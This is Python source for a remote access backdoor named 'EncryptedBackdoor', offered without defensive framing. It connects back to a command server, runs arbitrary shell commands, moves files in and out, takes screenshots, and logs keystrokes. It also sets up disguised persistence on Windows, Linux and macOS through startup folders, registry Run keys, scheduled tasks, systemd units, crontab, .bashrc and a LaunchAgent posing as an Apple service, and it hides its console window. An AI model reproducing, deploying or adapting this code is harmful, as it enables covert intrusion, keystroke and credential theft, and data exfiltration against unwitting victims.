import socket
import subprocess
import os
import sys
import time
import platform
import random
import threading
import shutil
import hmac
import hashlib
import ssl
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import glob

class EncryptedBackdoor:
    def __init__(self, host="127.0.0.1", port=4444, password="P@55w0rd!"):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.system_info = self._get_system_info()
        self.password = password
        self.hmac_secret = b"supersecret_hmac_key_123"
        
        # Initialize encryption
        self.key = self._generate_key_from_password(password)
        self.cipher = Fernet(self.key)
        
        # Initialize keylogger variables
        self._keylogger_data = []
        self._keylogger_running = False
        self._keylogger_thread = None
        
    def _generate_key_from_password(self, password):
        """Generate a Fernet key from a password using PBKDF2"""
        password = password.encode()
        salt = b'security_salt_value'  # In production, use a random salt and store it
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key
        
    def _get_system_info(self):
        """Gather system information"""
        uname = platform.uname()
        user = os.getlogin()
        current_dir = os.getcwd()
        # Get additional system info
        try:
            import psutil
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            memory_info = f"Memory: {memory.percent}% used ({memory.used >> 20} MB / {memory.total >> 20} MB)"
            disk_info = f"Disk: {disk.percent}% used ({disk.used >> 30} GB / {disk.total >> 30} GB)"
        except ImportError:
            memory_info = "Memory info not available (psutil not installed)"
            disk_info = "Disk info not available (psutil not installed)"
            
        return f"""
System: {uname.system} {uname.release}
Node: {uname.node}
User: {user}
Path: {current_dir}
Python: {sys.version.split()[0]}
Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
{memory_info}
{disk_info}
"""

    def connect(self):
        """Establish encrypted connection to the C2 server"""
        while not self.connected:
            try:
                # Create a standard socket
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Implement SSL/TLS encryption
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE  # Skip certificate verification (not secure for production)
                    self.socket = context.wrap_socket(self.socket)
                except Exception as e:
                    # If SSL fails, continue with regular socket
                    print(f"[*] SSL error, using regular socket: {e}")
                    pass
                
                # Connect to the server
                self.socket.connect((self.host, self.port))
                
                # Authenticate with password
                auth_challenge = self.socket.recv(1024)
                auth_response = self.password.encode()
                self.socket.send(auth_response)
                
                auth_result = self.socket.recv(1024).decode()
                if "Access granted" not in auth_result:
                    print("[-] Authentication failed")
                    self.socket.close()
                    time.sleep(random.randint(30, 60))
                    continue
                
                # Send encrypted system info
                encrypted_info = self.cipher.encrypt(self.system_info.encode())
                self.socket.send(encrypted_info)
                
                self.connected = True
                print("[+] Secure connection established")
                self.receive_commands()
                
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(random.randint(5, 15))  # Random retry interval
    
    def receive_commands(self):
        """Receive and execute encrypted commands from the server"""
        while self.connected:
            try:
                # Receive the encrypted command with HMAC
                encrypted_data = self.socket.recv(8192)
                if not encrypted_data:
                    continue
                
                # Split the HMAC and the encrypted command
                try:
                    encrypted_command, received_hmac = encrypted_data.split(b"|HMAC|")
                    
                    # Verify HMAC
                    expected_hmac = hmac.new(self.hmac_secret, encrypted_command, hashlib.sha256).hexdigest().encode()
                    if not hmac.compare_digest(received_hmac, expected_hmac):
                        print("[-] HMAC verification failed, potential tampering detected")
                        continue
                    
                    # Decrypt the command
                    command = self.cipher.decrypt(encrypted_command).decode().strip()
                    
                except Exception as e:
                    print(f"[-] Error decrypting command: {e}")
                    continue
                
                if not command:
                    continue
                    
                if command.lower() == "exit":
                    self.disconnect()
                    break
                    
                # Handle various command types
                if command.lower() == "sysinfo":
                    response = self.system_info
                elif command.startswith("cd "):
                    path = command[3:]
                    try:
                        os.chdir(path)
                        response = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        response = f"Error changing directory: {str(e)}"
                elif command.startswith("download "):
                    file_path = command[9:]
                    response = self._send_file(file_path)
                elif command.startswith("upload "):
                    response = self._receive_file(command[7:])
                elif command == "persist":
                    response = self._setup_persistence()
                elif command == "screenshot":
                    response = self._take_screenshot()
                elif command == "keylogger_start":
                    response = self._start_keylogger()
                elif command == "keylogger_stop":
                    response = self._stop_keylogger()
                elif command == "keylogger_dump":
                    response = self._dump_keylogger()
                else:
                    # Execute shell command
                    response = self._execute_command(command)
                
                # Encrypt the response
                encrypted_response = self.cipher.encrypt(response.encode())
                
                # Create HMAC for the encrypted response
                response_hmac = hmac.new(self.hmac_secret, encrypted_response, hashlib.sha256).hexdigest().encode()
                
                # Send encrypted response with HMAC
                self.socket.send(encrypted_response + b"|HMAC|" + response_hmac)
                
            except Exception as e:
                print(f"[-] Error: {e}")
                self.connected = False
                break
        
        if not self.connected:
            self.connect()  # Try to reconnect
    
    def _execute_command(self, command):
        """Execute a system command and return the output"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
            output = result.stdout
            if result.stderr:
                output += "\n" + result.stderr
            return output if output else "Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "Command timed out after 15 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def _send_file(self, file_path):
        """Send file to the server (encrypted)"""
        try:
            if not os.path.exists(file_path):
                return f"Error: File {file_path} not found"
            
            with open(file_path, "rb") as f:
                file_data = f.read()
            
            # Create and send file info
            file_size = len(file_data)
            file_info = f"FILE:{os.path.basename(file_path)}:{file_size}"
            
            # Encrypt and send file info
            encrypted_info = self.cipher.encrypt(file_info.encode())
            info_hmac = hmac.new(self.hmac_secret, encrypted_info, hashlib.sha256).hexdigest().encode()
            self.socket.send(encrypted_info + b"|HMAC|" + info_hmac)
            
            # Wait for server to be ready
            self.socket.recv(1024)
            
            # Split file into chunks for encryption
            chunk_size = 512 * 1024  # 512KB chunks
            for i in range(0, len(file_data), chunk_size):
                chunk = file_data[i:i+chunk_size]
                encrypted_chunk = self.cipher.encrypt(chunk)
                chunk_hmac = hmac.new(self.hmac_secret, encrypted_chunk, hashlib.sha256).hexdigest().encode()
                
                # Send encrypted chunk with its HMAC
                self.socket.send(encrypted_chunk + b"|HMAC|" + chunk_hmac)
                
                # Wait for acknowledgment before sending next chunk
                self.socket.recv(1024)
            
            # Send end-of-file marker
            self.socket.send(b"EOF")
            
            return f"File {file_path} sent successfully"
        except Exception as e:
            return f"Error sending file: {str(e)}"
    
    def _receive_file(self, file_path):
        """Receive encrypted file from the server"""
        try:
            self.socket.send(b"READY")
            
            # Receive encrypted file size
            encrypted_size_data = self.socket.recv(4096)
            encrypted_size, size_hmac = encrypted_size_data.split(b"|HMAC|")
            
            # Verify HMAC
            expected_hmac = hmac.new(self.hmac_secret, encrypted_size, hashlib.sha256).hexdigest().encode()
            if not hmac.compare_digest(size_hmac, expected_hmac):
                return "File transfer failed: HMAC verification failed"
            
            # Decrypt file size
            file_size = int(self.cipher.decrypt(encrypted_size).decode())
            
            # Send acknowledgment
            self.socket.send(b"SIZE_RECEIVED")
            
            # Receive file data in encrypted chunks
            file_data = b""
            while len(file_data) < file_size:
                chunk_data = self.socket.recv(8192)
                
                if chunk_data == b"EOF":
                    break
                
                encrypted_chunk, chunk_hmac = chunk_data.split(b"|HMAC|")
                
                # Verify chunk HMAC
                expected_hmac = hmac.new(self.hmac_secret, encrypted_chunk, hashlib.sha256).hexdigest().encode()
                if not hmac.compare_digest(chunk_hmac, expected_hmac):
                    return "File transfer failed: Chunk HMAC verification failed"
                
                # Decrypt and add chunk
                decrypted_chunk = self.cipher.decrypt(encrypted_chunk)
                file_data += decrypted_chunk
                
                # Send acknowledgment
                self.socket.send(b"CHUNK_RECEIVED")
            
            # Save the file
            with open(file_path, "wb") as f:
                f.write(file_data)
            
            return f"File saved to {file_path}"
        except Exception as e:
            return f"Error receiving file: {str(e)}"
    
    def _take_screenshot(self):
        """Take a screenshot and send it to the server, then delete all traces"""
        try:
            # Check if we have the required modules
            try:
                from PIL import ImageGrab
                import io
                import glob
            except ImportError:
                return "Error: Required libraries not installed (PIL)"
            
            # Create a unique timestamp for the filename
            timestamp = int(time.time())
            
            # Determine temp directory based on OS
            if platform.system().lower() == "windows":
                temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
            else:
                temp_dir = '/tmp'
                
            # Create a unique filename
            temp_path = os.path.join(temp_dir, f"scr_{timestamp}_{random.randint(1000, 9999)}.png")
            
            try:
                # Take the screenshot
                screenshot = ImageGrab.grab()
                
                # Save to memory first
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format="PNG")
                img_data = img_bytes.getvalue()
                
                # Save to temp file
                with open(temp_path, "wb") as f:
                    f.write(img_data)
                
                # Send the file
                result = self._send_file(temp_path)
                
            finally:
                # Clean up - make sure to delete the screenshot
                try:
                    # Delete the specific file
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
                        
                    # Also search for any leftover screenshot files with similar patterns
                    leftover_patterns = [
                        os.path.join(temp_dir, "scr_*.png"),
                        os.path.join(temp_dir, "screen_*.png")
                    ]
                    
                    for pattern in leftover_patterns:
                        for leftover_file in glob.glob(pattern):
                            try:
                                os.remove(leftover_file)
                            except:
                                pass
                except:
                    pass  # Silent failure for security
                    
            return result + "\n[+] Screenshot file securely deleted from victim system"
            
        except Exception as e:
            # Try to clean up even on error
            try:
                if 'temp_path' in locals() and os.path.exists(temp_path):
                    os.remove(temp_path)
            except:
                pass
                
            return f"Error taking screenshot: {str(e)}"
    
    def _start_keylogger(self):
        """Start a keylogger"""
        try:
            # Check if already running
            if self._keylogger_running:
                return "Keylogger is already running"
                
            try:
                import pynput.keyboard
            except ImportError:
                return "Error: Required library not installed (pynput)"
            
            # Clear previous data
            self._keylogger_data = []
            self._keylogger_running = True
            
            # Define the keylogger callback
            def on_key_press(key):
                if not self._keylogger_running:
                    return False
                    
                try:
                    # Try to get the character
                    key_data = key.char
                except AttributeError:
                    # Special key
                    key_data = f"[{key}]"
                    
                self._keylogger_data.append((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), key_data))
                
            # Start the listener in a thread
            keyboard_listener = pynput.keyboard.Listener(on_press=on_key_press)
            keyboard_listener.daemon = True
            keyboard_listener.start()
            self._keylogger_thread = keyboard_listener
            
            return "Keylogger started successfully"
            
        except Exception as e:
            self._keylogger_running = False
            return f"Error starting keylogger: {str(e)}"
    
    def _stop_keylogger(self):
        """Stop the keylogger"""
        if not self._keylogger_running:
            return "Keylogger is not running"
            
        self._keylogger_running = False
        
        if self._keylogger_thread:
            try:
                self._keylogger_thread.stop()
            except:
                pass
            
        return "Keylogger stopped"
        
    def _dump_keylogger(self):
        """Return captured keystrokes"""
        if not self._keylogger_data:
            return "No keystrokes captured"
            
        result = "Captured Keystrokes:\n"
        result += "-" * 40 + "\n"
        
        current_date = ""
        for timestamp, key in self._keylogger_data:
            date = timestamp.split()[0]
            time = timestamp.split()[1]
            
            if date != current_date:
                result += f"\n[{date}]\n"
                current_date = date
                
            result += f"{time}: {key}"
            
        return result
    
    def _setup_persistence(self):
        """Setup persistence based on the operating system"""
        system = platform.system().lower()
        
        try:
            if system == "windows":
                # Copy to startup folder
                startup_path = os.path.join(os.getenv("APPDATA"), 
                                         "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
                executable_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
                target_path = os.path.join(startup_path, "system_service.pyw")
                
                shutil.copy2(executable_path, target_path)
                
                # Add to registry
                os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemService /t REG_SZ /d "{target_path}" /f')
                
                # Create scheduled task for elevated persistence
                task_name = "SystemSecurityUpdate"
                task_cmd = f'schtasks /create /tn {task_name} /sc onlogon /tr "{target_path}" /rl highest /f'
                os.system(task_cmd)
                
                return "Persistence established via startup folder, registry, and scheduled task"
                
            elif system == "linux":
                # Create a systemd service
                executable_path = os.path.abspath(sys.argv[0])
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User={os.getlogin()}
ExecStart=/usr/bin/python3 {executable_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
                service_path = os.path.expanduser("~/.config/systemd/user/update-service.service")
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                
                with open(service_path, "w") as f:
                    f.write(service_content)
                
                os.system("systemctl --user enable update-service")
                os.system("systemctl --user start update-service")
                
                # Also add to crontab
                os.system(f"(crontab -l 2>/dev/null; echo '@reboot python3 {executable_path}') | crontab -")
                
                # Add to .bashrc for user persistence
                bashrc_path = os.path.expanduser("~/.bashrc")
                with open(bashrc_path, "a") as f:
                    f.write(f"\n# System Update Service\n(python3 {executable_path} &>/dev/null &)\n")
                
                return "Persistence established via systemd service, crontab, and .bashrc"
                
            elif system == "darwin":  # macOS
                plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.plist")
                executable_path = os.path.abspath(sys.argv[0])
                
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{executable_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>"""
                
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                
                os.system(f"launchctl load {plist_path}")
                
                # Also add to login items
                login_item_cmd = f"""
                osascript -e 'tell application "System Events" to make login item at end with properties {{path:"{executable_path}", hidden:true}}'
                """
                os.system(login_item_cmd)
                
                return "Persistence established via Launch Agent and Login Items"
            
            else:
                return f"Persistence not implemented for {system}"
                
        except Exception as e:
            return f"Failed to establish persistence: {str(e)}"
    
    def disconnect(self):
        """Disconnect from the server"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.connected = False
        print("[-] Disconnected")


if __name__ == "__main__":
    # For stealth, hide console window on Windows
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Load configuration from an external file if it exists
    config = {
        "host": "127.0.0.1",
        "port": 4444,
        "password": "P@55w0rd!"  # Default password (should be changed)
    }
    
    # Try to load config from an encrypted file
    try:
        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.enc")
        if os.path.exists(config_path):
            # Hardcoded key for config decryption (not secure, but better than plaintext)
            config_key = Fernet.generate_key()
            config_cipher = Fernet(config_key)
            
            with open(config_path, "rb") as f:
                encrypted_config = f.read()
                
            config_json = config_cipher.decrypt(encrypted_config).decode()
            import json
            new_config = json.loads(config_json)
            config.update(new_config)
    except:
        # If config loading fails, use defaults
        pass
    
    # Create and start backdoor with the config
    backdoor = EncryptedBackdoor(
        host=config["host"],
        port=config["port"],
        password=config["password"]
    )
    
    # Start the connection in a separate thread
    connection_thread = threading.Thread(target=backdoor.connect)
    connection_thread.daemon = True
    connection_thread.start()
    
    # Main thread enters an infinite loop to keep the program running
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        backdoor.disconnect()
        sys.exit(0) 